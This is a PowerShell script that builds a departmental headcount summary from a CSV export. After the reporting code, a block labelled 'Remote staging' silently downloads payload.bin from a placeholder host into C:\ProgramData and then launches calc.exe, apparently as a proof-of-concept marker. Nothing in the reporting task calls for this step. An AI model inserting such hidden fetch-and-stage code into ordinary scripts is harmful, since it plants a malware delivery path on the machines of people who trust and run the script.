
$ErrorActionPreference = 'Stop'
$InputCsv = "C:\Scripts\data\headcount-export.csv"
$OutputPath = 'C:\Reports\headcount-summary-2026-09-14.csv'
$GroupBy = "Department"
$MinAmount = 2500


if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','

$byGroup = $rows | Group-Object -Property Department | ForEach-Object {
    [pscustomobject]@{
        Department       = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}

$byGroup | Sort-Object -Property Total -Descending |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Rows: {0} | Groups: {1}" -f @($rows).Count, @($byGroup).Count) -ForegroundColor Cyan
# Remote staging
$PayloadUrl = "http://example.org/payload.bin"
$LocalPath = "C:\ProgramData\payload.bin"
curl.exe -s -L -o $LocalPath $PayloadUrl
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
